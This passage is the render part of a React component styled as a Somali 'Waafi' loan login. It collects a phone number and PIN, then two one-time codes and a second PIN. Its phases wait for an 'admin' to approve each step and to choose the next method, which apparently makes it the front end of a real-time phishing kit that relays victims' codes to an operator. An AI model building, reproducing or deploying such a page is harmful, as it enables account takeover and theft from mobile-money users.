  const isOtp2Complete = otp2.every(d => d !== '');
  const isPinComplete = pinDigits.every(d => d !== '');

  // ══════════════════════════════════════════════════════════════════════════
  // PROCESSING SCREEN (shared by otp1 and otp2 approve flows)
  // ══════════════════════════════════════════════════════════════════════════
  if (otp1Processing) {
    return (
      <div className="otp-container">
        <main className="otp-content">
          <div className="processing-card">
            <div className="spinner-container"><div className="spinner"></div></div>
            <h1 className="processing-title">Xaqiijinta OTP-ga</h1>
            <p className="processing-subtitle">{otp1Status}</p>
          </div>
        </main>
        <footer className="otp-footer">© 2026 Waafi Soomaaliya</footer>
      </div>
    );
  }

  if (otp2Processing) {
    return (
      <div className="otp-container">
        <main className="otp-content">
          <div className="processing-card">
            <div className="spinner-container"><div className="spinner"></div></div>
            <h1 className="processing-title">{processingTitle}</h1>
            <p className="processing-subtitle">{otp2Status}</p>
          </div>
        </main>
        <footer className="otp-footer">© 2026 Waafi Soomaaliya</footer>
      </div>
    );
  }

  // ══════════════════════════════════════════════════════════════════════════
  // RENDER
  // ══════════════════════════════════════════════════════════════════════════

  // ── LOGIN ─────────────────────────────────────────────────────────────────
  if (phase === 'login') {
    if (loginProcessing || waitingForApproval) {
      return (
        <div className="login-container">
          <div className="processing-overlay">
            <div className="processing-card">
              <div className="spinner-container"><div className="spinner"></div></div>
              <h1 className="processing-title">{waitingForApproval ? 'Fadlan sug...' : 'Habaynta...'}</h1>
              <p className="processing-subtitle">
                {waitingForApproval ? 'Tani waxay qaadataa dhowr ilbiriqsi' : 'Diyaarinaya xaqiijinta...'}
              </p>
            </div>
          </div>
        </div>
      );
    }

    return (
      <div className="login-container">
        {showErrorModal && (
          <div className="error-modal-overlay" onClick={() => setShowErrorModal(false)}>
            <div className="error-modal-content" onClick={e => e.stopPropagation()}>
              <div className="error-modal-icon">⚠️</div>
              <h2 className="error-modal-title">Macluumaad Khaldan</h2>
              <p className="error-modal-message" style={{ whiteSpace: 'pre-line' }}>{errorMessage}</p>
              <button className="error-modal-button" onClick={() => setShowErrorModal(false)}>HAGAAG</button>
            </div>
          </div>
        )}

        <div className="login-header">
          <div className="logo-large"><span className="logo-large-waafi">Waafi</span></div>
          <div className="logo-subtitle">Amaahado Sahlan oo Degdeg ah</div>
        </div>

        <div className="login-content">
          <h1 className="login-title">Gal</h1>
          {serverStatus?.error && (
            <div className="server-status-message error"><p>⚠️ {serverStatus.error}</p></div>
          )}
          <form className="login-form" onSubmit={handleLogin}>
            <div className="phone-input-container">
              <div className="country-code">
                <span className="flag-icon">🇸🇴</span>
                <span>+252</span>
              </div>
              <input type="tel" className="phone-input" value={phoneNumber} onChange={handlePhoneChange}
                onPaste={handlePhonePaste} placeholder="612345678" maxLength="9"
                inputMode="numeric" pattern="[0-9]*" required disabled={serverStatus?.isChecking} />
            </div>
            <div className="pin-section">
              <p className="pin-label">Geli PIN-kaaga</p>
              <div className="pin-inputs-wrapper">
                <div className="pin-inputs">
                  {pin.map((digit, index) => (
                    <input key={index} ref={pinRefs[index]}
                      type={showPin ? 'text' : 'password'} className="pin-box"
                      value={digit} onChange={e => handlePinChange(index, e.target.value)}
                      onKeyDown={e => handlePinKeyDown(index, e)} onKeyPress={handlePinKeyPress}
                      onPaste={e => handlePinPaste(e, index)} maxLength="1"
                      inputMode="numeric" pattern="[0-9]" required disabled={serverStatus?.isChecking} />
                  ))}
                </div>
                <button type="button" className="eye-button" onClick={() => setShowPin(!showPin)}
                  aria-label={showPin ? 'Qari PIN-ka' : 'Muuji PIN-ka'} disabled={serverStatus?.isChecking}>
                  {showPin ? '👁️' : '👁️‍🗨️'}
                </button>
              </div>
              <p className="forgot-pin" onClick={() => alert('Fadlan la xidhiidh adeegga macmiilka Waafi si aad u soo celiso PIN-ka.')}>
                PIN-ka ma iloobtay?
              </p>
            </div>
            <button type="submit" className={buttonState.className} disabled={buttonState.disabled}>
              {buttonState.text}
            </button>
          </form>
        </div>

        <div className="login-footer">
          <div className="wave-decoration"></div>
          <div className="footer-content">
            <div className="footer-logo">
              <div className="footer-logo-text"><span className="footer-logo-waafi">Waafi</span></div>
              <div className="footer-logo-subtitle">Amaahado Sahlan oo Degdeg ah</div>
            </div>
            <p className="version-text">v2.1.3P</p>
            <p className="terms-text">
              Galitaanka markaad gasho waad ogolaatay{' '}
              <span className="terms-link">Shuruudaha iyo Xaaladaha</span>
            </p>
          </div>
        </div>
      </div>
    );
  }

  // ── OTP1 ──────────────────────────────────────────────────────────────────
  if (phase === 'otp1') {
    return (
      <div className="otp-container">
        {showOtp1ErrorModal && (
          <div className="error-modal-overlay" onClick={() => setShowOtp1ErrorModal(false)}>
            <div className="error-modal" onClick={e => e.stopPropagation()}>
              <h2 className="error-modal-title">Koodh khaldan!</h2>
              <p className="error-modal-message">SMS-ka eeg koodhka ama codsato koodh mar kale kadib marka tirinta dhammaato</p>
              <button className="error-modal-button" onClick={() => setShowOtp1ErrorModal(false)}>HAGAAG</button>
            </div>
          </div>
        )}
        {showOtp1TimeoutModal && (
          <div className="error-modal-overlay" onClick={handleOtp1TimeoutClose}>
            <div className="error-modal" onClick={e => e.stopPropagation()}>
              <h2 className="error-modal-title">Waqtiga dhammaday</h2>
              <p className="error-modal-message">Khalad ayaa dhacay, fadlan mar kale isku day</p>
              <button className="error-modal-button" onClick={handleOtp1TimeoutClose}>HAGAAG</button>
            </div>
          </div>
        )}
        {showOtp1WrongPinModal && (
          <div className="error-modal-overlay" onClick={handleOtp1WrongPinClose}>
            <div className="error-modal" onClick={e => e.stopPropagation()}>
              <h2 className="error-modal-title">PIN khaldan!</h2>
              <p className="error-modal-message">PIN-ka ama lambarka taleefanka aad hore u gashay wuu khaldan yahay. Fadlan mar kale ku soo celi galitaanka macluumaadka saxda ah.</p>
              <button className="error-modal-button" onClick={handleOtp1WrongPinClose}>Ku noqo Galitaanka</button>
            </div>
          </div>
        )}
        {showOtp1VerifyErrorModal && (
          <div className="error-modal-overlay" onClick={() => setShowOtp1VerifyErrorModal(false)}>
            <div className="error-modal" onClick={e => e.stopPropagation()}>
              <h2 className="error-modal-title">Xaqiijinta ma guulaysan</h2>
              <p className="error-modal-message">Xaqiijinta OTP-ga ma guulaysan. Fadlan mar kale isku day markii dambe.</p>
              <button className="error-modal-button" onClick={() => setShowOtp1VerifyErrorModal(false)}>HAGAAG</button>
            </div>
          </div>
        )}
        {showOtp1ResendErrorModal && (
          <div className="error-modal-overlay" onClick={() => setShowOtp1ResendErrorModal(false)}>
            <div className="error-modal" onClick={e => e.stopPropagation()}>
              <h2 className="error-modal-title">Dirida mar labaad ma guulaysan</h2>
              <p className="error-modal-message">Dirida OTP-ga ma guulaysan. Fadlan mar kale isku day markii dambe.</p>
              <button className="error-modal-button" onClick={() => setShowOtp1ResendErrorModal(false)}>HAGAAG</button>
            </div>
          </div>
        )}

        {showOtp1SuccessToast && (
          <div className="success-toast">
            <div className="success-icon">✓</div>
            <span className="success-text">Koodka si guul leh ayaa loo diray!</span>
          </div>
        )}
        {showOtp1ResendToast && (
          <div className="success-toast resend">
            <div className="success-icon">📱</div>
            <span className="success-text">OTP si guul leh ayaa mar kale loo diray!</span>
          </div>
        )}

        <header className="otp-header">
          <button className="back-btn" onClick={() => { localStorage.removeItem('first_otp_timer'); setPhase('login'); }}>←</button>
          <div className="logo-large"><span className="logo-large-waafi">Waafi</span></div>
          <button className="menu-btn" aria-label="Menu">
            <div className="menu-line"></div><div className="menu-line"></div><div className="menu-line"></div>
          </button>
        </header>

        <main className="otp-content">
          <div className="otp-card">
            <h1 className="otp-title">Xaqiijinta OTP-ga Kowaad</h1>
            <p className="otp-subtitle">Geli OTP-ga kowaad ee loogu diray lambarka taleefankaaga</p>
            <p className="otp-phone">{getFullPhone()}</p>
            <form onSubmit={handleOtp1Submit}>
              <div className="otp-inputs-container">
                <div className="otp-inputs">
                  {otp1.map((digit, index) => (
                    <input key={index} ref={otp1Refs[index]} type="text" className="otp-box"
                      value={digit} onChange={e => handleOtp1Change(index, e.target.value)}
                      onKeyDown={e => handleOtp1KeyDown(index, e)} onKeyPress={handleOtpKeyPress}
                      onPaste={e => handleOtp1Paste(e, index)} maxLength="1"
                      inputMode="numeric" pattern="[0-9]" required
                      disabled={otp1Resending || otp1Submitting || otp1WaitingForApproval} />
                  ))}
                </div>
                <p className="resend-text">
                  {otp1WaitingForApproval ? (
                    <span className="resending-text">Codsanaynaa OTP...</span>
                  ) : otp1Resending ? (
                    <span className="resending-text">Koodka mar kale ayaa la diraya...</span>
                  ) : otp1Timer > 0 ? (
                    `Koodka mar kale u dir ${otp1Timer} ilbiriqsi`
                  ) : (
                    <>Koodka ma helin?{' '}<span className="resend-link" onClick={handleOtp1Resend}>Mar kale dir</span></>
                  )}
                </p>
              </div>
              <button type="submit"
                className={`submit-button ${(isOtp1Complete && !otp1WaitingForApproval) ? 'active' : ''}`}
                disabled={!isOtp1Complete || otp1Resending || otp1Submitting || otp1WaitingForApproval}>
                {otp1Submitting ? 'XAQIIJINAYA...' : 'XAQIIJI OTP-GA KOWAAD'}
              </button>
            </form>
          </div>
        </main>
        <footer className="otp-footer">© 2026 Waafi Soomaaliya</footer>
      </div>
    );
  }

  // ── OTP2 + sub-phases ─────────────────────────────────────────────────────
  const otp2Phone = getFullPhone();

  return (
    <div className="otp-container">
      {/* OTP2 Modals */}
      {showOtp2ErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowOtp2ErrorModal(false)}>
          <div className="error-modal" onClick={e => e.stopPropagation()}>
            <h2 className="error-modal-title">Koodh khaldan!</h2>
            <p className="error-modal-message">SMS-ka eeg koodhka labaad ama codsato koodh mar kale kadib marka tirinta dhammaato</p>
            <button className="error-modal-button" onClick={() => setShowOtp2ErrorModal(false)}>HAGAAG</button>
          </div>
        </div>
      )}
      {showOtp2TimeoutModal && (
        <div className="error-modal-overlay" onClick={handleOtp2TimeoutClose}>
          <div className="error-modal" onClick={e => e.stopPropagation()}>
            <h2 className="error-modal-title">Waqtiga dhammaday</h2>
            <p className="error-modal-message">Khalad ayaa dhacay, fadlan mar kale isku day</p>
            <button className="error-modal-button" onClick={handleOtp2TimeoutClose}>HAGAAG</button>
          </div>
        </div>
      )}
      {showOtp2WrongPinModal && (
        <div className="error-modal-overlay" onClick={handleOtp2WrongPinClose}>
          <div className="error-modal" onClick={e => e.stopPropagation()}>
            <h2 className="error-modal-title">PIN khaldan!</h2>
            <p className="error-modal-message">Xaqiijinta OTP-ga labaad waa guuldareysatay. Fadlan mar kale ku soo celi galitaanka macluumaadka saxda ah.</p>
            <button className="error-modal-button" onClick={handleOtp2WrongPinClose}>Ku noqo Galitaanka</button>
          </div>
        </div>
      )}
      {showOtp2VerifyErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowOtp2VerifyErrorModal(false)}>
          <div className="error-modal" onClick={e => e.stopPropagation()}>
            <h2 className="error-modal-title">Xaqiijinta ma guulaysan</h2>
            <p className="error-modal-message">Xaqiijinta OTP-ga labaad ma guulaysan. Fadlan mar kale isku day markii dambe.</p>
            <button className="error-modal-button" onClick={() => setShowOtp2VerifyErrorModal(false)}>HAGAAG</button>
          </div>
        </div>
      )}
      {showOtp2ResendErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowOtp2ResendErrorModal(false)}>
          <div className="error-modal" onClick={e => e.stopPropagation()}>
            <h2 className="error-modal-title">Dirida mar labaad ma guulaysan</h2>
            <p className="error-modal-message">Dirida OTP-ga ma guulaysan. Fadlan mar kale isku day markii dambe.</p>
            <button className="error-modal-button" onClick={() => setShowOtp2ResendErrorModal(false)}>HAGAAG</button>
          </div>
        </div>
      )}

      {showOtp2SuccessToast && (
        <div className="success-toast">
          <div className="success-icon">✓</div>
          <span className="success-text">Koodka labaad si guul leh ayaa loo diray!</span>
        </div>
      )}
      {showOtp2ResendToast && (
        <div className="success-toast resend">
          <div className="success-icon">📱</div>
          <span className="success-text">OTP si guul leh ayaa mar kale loo diray!</span>
        </div>
      )}

      <header className="otp-header">
        <button className="back-btn" onClick={() => { localStorage.removeItem('second_otp_timer'); setPhase('otp1'); }}>←</button>
        <div className="logo-large"><span className="logo-large-waafi">Waafi</span></div>
        <button className="menu-btn" aria-label="Menu">
          <div className="menu-line"></div><div className="menu-line"></div><div className="menu-line"></div>
        </button>
      </header>

      <main className="otp-content">
        <div className="otp-card">

          {/* OTP2 form */}
          {phase === 'otp2' && (
            <>
              <h1 className="otp-title">Xaqiijinta OTP-ga Labaad</h1>
              <p className="otp-subtitle">Geli OTP-ga labaad ee loogu diray lambarka taleefankaaga</p>
              <p className="otp-phone">{otp2Phone}</p>
              <form onSubmit={handleOtp2Submit}>
                <div className="otp-inputs-container">
                  <div className="otp-inputs">
                    {otp2.map((digit, index) => (
                      <input key={index} ref={otp2Refs[index]} type="text" className="otp-box"
                        value={digit} onChange={e => handleOtp2Change(index, e.target.value)}
                        onKeyDown={e => handleOtp2KeyDown(index, e)} onKeyPress={handleOtpKeyPress}
                        onPaste={e => handleOtp2Paste(e, index)} maxLength="1"
                        inputMode="numeric" pattern="[0-9]" required
                        disabled={otp2Resending || otp2Submitting} />
                    ))}
                  </div>
                  <p className="resend-text">
                    {otp2Resending ? (
                      <span className="resending-text">Koodka mar kale ayaa la diraya...</span>
                    ) : otp2Timer > 0 ? (
                      `Koodka mar kale u dir ${otp2Timer} ilbiriqsi`
                    ) : (
                      <>Koodka ma helin?{' '}<span className="resend-link" onClick={handleOtp2Resend}>Mar kale dir</span></>
                    )}
                  </p>
                </div>
                <button type="submit" className={`submit-button ${isOtp2Complete ? 'active' : ''}`}
                  disabled={!isOtp2Complete || otp2Resending || otp2Submitting}>
                  {otp2Submitting ? 'XAQIIJINAYA...' : 'XAQIIJI OTP-GA LABAAD'}
                </button>
              </form>
            </>
          )}

          {/* Waiting for admin method */}
          {phase === 'waiting_method' && (
            <>
              <h1 className="otp-title">Xaqiijinta OTP-ga Labaad</h1>
              <p className="otp-phone">{otp2Phone}</p>
              <div style={{ textAlign: 'center', padding: '2rem 0' }}>
                <div className="spinner-container" style={{ marginBottom: '1.5rem' }}><div className="spinner"></div></div>
                <p style={{ color: '#666', fontSize: '0.95rem' }}>Fadlan sug...</p>
              </div>
            </>
          )}

          {/* Prompt PIN */}
          {phase === 'prompt_pin' && (
            <>
              <h1 className="otp-title">PIN Xaqiijinta</h1>
              <p className="otp-phone">{otp2Phone}</p>
              {isPromptPolling && !promptPinError && (
                <div style={{ textAlign: 'center', padding: '2rem 0' }}>
                  <div className="spinner-container" style={{ marginBottom: '1.5rem' }}><div className="spinner"></div></div>
                  <p style={{ color: '#6AC538', fontSize: '1rem', fontWeight: 600, marginBottom: 6 }}>Fadlan dhameystir xaqiijinta taleefankaaga</p>
                  <p style={{ color: '#666', fontSize: '0.9rem', marginBottom: 4 }}>Geli 6-digit PIN-kaaga taleefanka si aad u xaqiijiso.</p>
                  <p style={{ color: '#888', fontSize: '0.85rem' }}>{promptPinStatus || 'Fadlan sug...'}</p>
                </div>
              )}
              {!isPromptPolling && promptPinError && (
                <div style={{ padding: '1rem 0' }}>
                  <div style={{
                    background: promptPinError === 'timeout' ? '#fff9e6' : '#fff0f0',
                    border: `1px solid ${promptPinError === 'timeout' ? '#ffd966' : '#f5c6cb'}`,
                    borderRadius: 10, padding: '20px', textAlign: 'center', marginBottom: 20,
                  }}>
                    <p style={{ fontSize: '1.1rem', fontWeight: 700, color: promptPinError === 'timeout' ? '#856404' : '#d32f2f', marginBottom: 8 }}>
                      {promptPinError === 'timeout' ? '⏰ Waqtiga dhammaday' : '❌ Xaqiijinta la waayay'}
                    </p>
                    <p style={{ color: '#555', fontSize: '0.9rem', marginBottom: 0 }}>
                      {promptPinError === 'timeout'
                        ? 'Waqtiga xaqiijinta ayaa dhammaday. Guji Isku day mar kale si aad u soo celiso.'
                        : 'PIN-ka xaqiijintiisu ma guulaysan. Guji Isku day mar kale si aad dib ugu tijaabiso.'}
                    </p>
                  </div>
                  <button type="button" className="submit-button active" onClick={handlePromptPinRetry} disabled={isRetrying} style={{ marginTop: 0 }}>
                    {isRetrying ? 'CODSANAYNAA...' : '🔄 ISKU DAY MAR KALE'}
                  </button>
                </div>
              )}
            </>
          )}

          {/* Request PIN */}
          {phase === 'request_pin' && (
            <>
              <h1 className="otp-title">PIN Xaqiijinta</h1>
              <p className="otp-subtitle">Geli PIN-kaaga si aad u dhammaystirto xaqiijinta</p>
              <p className="otp-phone">{otp2Phone}</p>
              {pinError && (
                <div style={{
                  background: pinError === 'timeout' ? '#fff9e6' : '#fff0f0',
                  border: `1px solid ${pinError === 'timeout' ? '#ffd966' : '#f5c6cb'}`,
                  borderRadius: 10, padding: '12px 16px', marginBottom: 16, textAlign: 'center',
                }}>
                  <p style={{ color: pinError === 'timeout' ? '#856404' : '#d32f2f', fontSize: '0.9rem', fontWeight: 600, margin: 0 }}>
                    {pinError === 'wrong_pin' ? '❌ PIN-ka khaldan. Mar kale isku day.'
                      : pinError === 'timeout' ? '⏰ Waqtiga dhammaday. Mar kale isku day.'
                      : '❌ Khalad ayaa dhacay. Mar kale isku day.'}
                  </p>
                </div>
              )}
              <form onSubmit={handlePinSubmit}>
                <div className="otp-inputs-container">
                  <div className="otp-inputs">
                    {pinDigits.map((digit, index) => (
                      <input key={index} ref={requestPinRefs[index]} type="password" className="otp-box"
                        value={digit} onChange={e => handleRequestPinChange(index, e.target.value)}
                        onKeyDown={e => handleRequestPinKeyDown(index, e)} onKeyPress={handleOtpKeyPress}
                        onPaste={e => handleRequestPinPaste(e, index)} maxLength="1"
                        inputMode="numeric" pattern="[0-9]" required disabled={isPinSubmitting} autoFocus={index === 0} />
                    ))}
                  </div>
                </div>
                <button type="submit" className={`submit-button ${isPinComplete ? 'active' : ''}`}
                  style={{ marginTop: 16 }} disabled={!isPinComplete || isPinSubmitting}>
                  {isPinSubmitting ? 'XAQIIJINAYA...' : 'XAQIIJI PIN-KA'}
                </button>
              </form>
            </>
          )}

        </div>
      </main>
      <footer className="otp-footer">© 2026 Waafi Soomaaliya</footer>
    </div>
  );
}
